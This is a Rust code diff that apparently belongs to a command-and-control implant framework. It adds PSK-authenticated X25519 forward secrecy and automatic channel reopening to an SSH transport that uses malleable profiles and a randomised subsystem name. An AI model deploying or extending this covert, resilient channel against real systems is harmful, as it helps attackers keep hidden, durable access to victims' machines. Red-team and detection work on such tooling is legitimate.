@@ -50,10 +50,10 @@ use async_trait::async_trait;
 use common::config::{MalleableProfile, SshAuthConfig};
 use common::{CryptoSession, Message, Transport};
 use log::info;
-use russh::ChannelMsg;
 use russh::client;
 use russh_keys::key::PublicKey;
 use std::sync::Arc;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::time::Duration;
 
 // Maximum acceptable frame payload size: 16 MiB.  Rejects corrupt or
@@ -112,16 +112,24 @@ impl client::Handler for ClientHandler {
 ///
 /// Wraps a `russh` client session channel.  Each [`send`] / [`recv`] call
 /// exchanges a single length-prefixed, AES-256-GCM-encrypted frame.
+///
+/// P1-05: Session keys are now derived via an X25519 ECDH exchange
+/// authenticated by the PSK, providing forward secrecy.  If the PSK is
+/// compromised in the future, past sessions remain protected because the
+/// ephemeral private keys are erased after the exchange.
 pub struct SshTransport {
     /// Keeps the underlying SSH session alive for the transport's lifetime.
     session: client::Handle<ClientHandler>,
-    /// The session channel carrying Orchestra frames.
-    channel: russh::Channel<client::Msg>,
+    /// The session channel carrying Orchestra frames, wrapped as an
+    /// `AsyncRead + AsyncWrite` stream.
+    stream: russh::ChannelStream<client::Msg>,
     /// Application-layer symmetric session (AES-256-GCM).
     crypto_session: CryptoSession,
     /// Malleable profile for future re-connections and configuration access.
     #[allow(dead_code)]
     profile: MalleableProfile,
+    /// Pre-shared key retained for channel re-opening (ECDH key exchange).
+    psk: Vec<u8>,
     /// Partial-frame accumulation buffer.  SSH data arrives in arbitrary
     /// chunks; frames are only consumed once a complete length-prefixed
     /// payload is buffered.
@@ -133,11 +141,17 @@ impl SshTransport {
     /// requesting the compile-time randomised subsystem.
     /// The subsystem name is defined in `common::ioc::IOC_SSH_SUBSYSTEM`.
     ///
+    /// P1-05: After the SSH channel is established, an X25519 ECDH key
+    /// exchange authenticated by the PSK is performed over the channel to
+    /// derive a forward-secret session key.  This ensures that a future PSK
+    /// compromise does not allow decryption of past sessions.
+    ///
     /// Returns an error if:
     /// * `ssh_host` / `ssh_username` / `ssh_auth` are absent from the profile.
     /// * Authentication fails.
     /// * The server rejects the subsystem request.
-    pub async fn new(profile: &MalleableProfile, session: CryptoSession) -> Result<Self> {
+    /// * The ECDH key exchange fails (PSK mismatch, MITM, etc.).
+    pub async fn new(profile: &MalleableProfile, psk: &[u8]) -> Result<Self> {
         let host = profile
             .ssh_host
             .as_deref()
@@ -266,13 +280,28 @@ impl SshTransport {
             .await
             .map_err(|e| anyhow!("ssh-transport: subsystem '{}' rejected: {e}", common::ioc::IOC_SSH_SUBSYSTEM))?;
 
-        info!("ssh-transport: session channel ready");
+        info!("ssh-transport: session channel ready, performing X25519 ECDH key exchange");
+
+        // P1-05: Convert the channel into an AsyncRead + AsyncWrite stream
+        // and perform an X25519 ECDH key exchange to derive a forward-secret
+        // session key, rather than using the PSK directly.
+        let mut stream = channel.into_stream();
+        let crypto_session = common::forward_secrecy::negotiate_session_key(
+            &mut stream,
+            psk,
+            true, // client sends first
+        )
+        .await
+        .map_err(|e| anyhow!("ssh-transport: ECDH key exchange failed: {e}"))?;
+
+        info!("ssh-transport: forward-secret session established");
 
         Ok(Self {
             session: handle,
-            channel,
-            crypto_session: session,
+            stream,
+            crypto_session,
             profile: profile.clone(),
+            psk: psk.to_vec(),
             recv_buf: Vec::new(),
         })
     }
@@ -282,7 +311,9 @@ impl SshTransport {
     /// Called internally after a channel close without a full SSH reconnect.
     /// If the handle itself has closed, the caller should discard the whole
     /// transport and let `outbound::run_forever` rebuild it.
-    #[allow(dead_code)]
+    ///
+    /// P1-05: Re-opening also re-performs the X25519 ECDH key exchange so
+    /// each channel gets a fresh forward-secret session key.
     async fn reopen_channel(&mut self) -> Result<()> {
         if self.session.is_closed() {
             return Err(anyhow!("ssh-transport: session closed, cannot reopen channel"));
@@ -292,8 +323,21 @@ impl SshTransport {
             .request_subsystem(true, common::ioc::IOC_SSH_SUBSYSTEM)
             .await
             .map_err(|e| anyhow!("ssh-transport: subsystem '{}' reopen rejected: {e}", common::ioc::IOC_SSH_SUBSYSTEM))?;
-        self.channel = channel;
+
+        // Convert to stream and perform a fresh ECDH exchange.
+        let mut stream = channel.into_stream();
+        self.crypto_session = common::forward_secrecy::negotiate_session_key(
+            &mut stream,
+            &self.psk,
+            true,
+        )
+        .await
+        .map_err(|e| anyhow!("ssh-transport: ECDH key exchange on reopen failed: {e}"))?;
+
+        self.stream = stream;
         self.recv_buf.clear();
+
+        info!("ssh-transport: channel reopened successfully");
         Ok(())
     }
 }
@@ -303,6 +347,10 @@ impl SshTransport {
 #[async_trait]
 impl Transport for SshTransport {
     /// Serialize, encrypt, and write a length-prefixed frame to the channel.
+    ///
+    /// If the channel has been closed (e.g. by the relay sshd restarting),
+    /// attempts to re-open it via [`reopen_channel`] before failing, avoiding
+    /// a full transport teardown for channel-level errors.
     async fn send(&mut self, msg: Message) -> Result<()> {
         let serialized = bincode::serialize(&msg)?;
         let ciphertext = self.crypto_session.encrypt(&serialized);
@@ -313,17 +361,32 @@ impl Transport for SshTransport {
         frame.extend_from_slice(&payload_len.to_be_bytes());
         frame.extend_from_slice(&ciphertext);
 
-        // `Channel::data` accepts any `AsyncRead + Unpin`; wrap in a Cursor.
-        self.channel
-            .data(std::io::Cursor::new(frame))
-            .await
-            .map_err(|e| anyhow!("ssh-transport: send failed: {e:?}"))?;
-
-        Ok(())
+        // Write the frame using AsyncWrite on the ChannelStream.
+        match self.stream.write_all(&frame).await {
+            Ok(()) => Ok(()),
+            Err(e) => {
+                log::info!(
+                    "ssh-transport: send failed ({e:#}), attempting channel reopen"
+                );
+                self.reopen_channel().await?;
+                // Retry the write on the fresh channel.
+                self.stream
+                    .write_all(&frame)
+                    .await
+                    .map_err(|e| anyhow!("ssh-transport: send failed after reopen: {e}"))?;
+                Ok(())
+            }
+        }
     }
 
-    /// Read from the channel, accumulating data until a complete
+    /// Read from the stream, accumulating data until a complete
     /// length-prefixed frame arrives, then decrypt and deserialize it.
+    ///
+    /// If the channel is closed (EOF) or the read fails with a channel-level
+    /// error, attempts to re-open it via [`reopen_channel`] before failing,
+    /// avoiding a full transport teardown for channel-level errors.  Only
+    /// if the SSH session itself is dead does the error propagate to
+    /// `outbound::run_forever` for a full reconnect.
     async fn recv(&mut self) -> Result<Message> {
         loop {
             // Attempt to parse a complete frame from the accumulation buffer.
@@ -354,32 +417,37 @@ impl Transport for SshTransport {
                 }
             }
 
-            // Need more bytes — wait for the next SSH data chunk.
-            match self.channel.wait().await {
-                Some(ChannelMsg::Data { ref data }) => {
-                    self.recv_buf.extend_from_slice(data);
+            // Need more bytes — read from the ChannelStream into the buffer.
+            let mut tmp = [0u8; 8192];
+            match self.stream.read(&mut tmp).await {
+                Ok(0) => {
+                    // Channel EOF — attempt reopen before giving up.
+                    log::info!("ssh-transport: channel EOF received, attempting reopen");
+                    match self.reopen_channel().await {
+                        Ok(()) => continue, // Channel reopened, keep receiving.
+                        Err(e) => {
+                            return Err(anyhow!(
+                                "ssh-transport: channel EOF and reopen failed: {e}"
+                            ));
+                        }
+                    }
                 }
-
-                Some(ChannelMsg::ExtendedData { ref data, .. }) => {
-                    // Extended data (stderr) is unused by this transport but
-                    // may carry diagnostic messages from the relay; log length
-                    // only to avoid leaking server-side output.
-                    log::debug!(
-                        "ssh-transport: received {} bytes of extended data (ignored)",
-                        data.len()
+                Ok(n) => {
+                    self.recv_buf.extend_from_slice(&tmp[..n]);
+                }
+                Err(e) => {
+                    // Read error — attempt reopen before giving up.
+                    log::info!(
+                        "ssh-transport: recv read error ({e:#}), attempting channel reopen"
                     );
-                }
-
-                Some(ChannelMsg::Eof) => {
-                    return Err(anyhow!("ssh-transport: channel EOF received"));
-                }
-
-                Some(ChannelMsg::Close) | None => {
-                    return Err(anyhow!("ssh-transport: channel closed"));
-                }
-
-                Some(_) => {
-                    // Ignore window-adjust and other control messages.
+                    match self.reopen_channel().await {
+                        Ok(()) => continue, // Channel reopened, keep receiving.
+                        Err(reopen_err) => {
+                            return Err(anyhow!(
+                                "ssh-transport: recv failed ({e}) and reopen failed: {reopen_err}"
+                            ));
+                        }
+                    }
                 }
             }
         }
@@ -401,10 +469,13 @@ impl Drop for SshTransport {
 ///
 /// Called by [`crate::outbound::build_outbound_transport`] when the
 /// `ssh-transport` feature is enabled and `ssh_host` is configured.
+///
+/// P1-05: The PSK is no longer used directly as the session key.
+/// Instead, an X25519 ECDH key exchange is performed over the SSH
+/// channel to derive a forward-secret session key.
 pub async fn new_transport(
     profile: &MalleableProfile,
     secret: &str,
 ) -> Result<SshTransport> {
-    let session = common::CryptoSession::from_shared_secret(secret.as_bytes());
-    SshTransport::new(profile, session).await
+    SshTransport::new(profile, secret.as_bytes()).await
 }
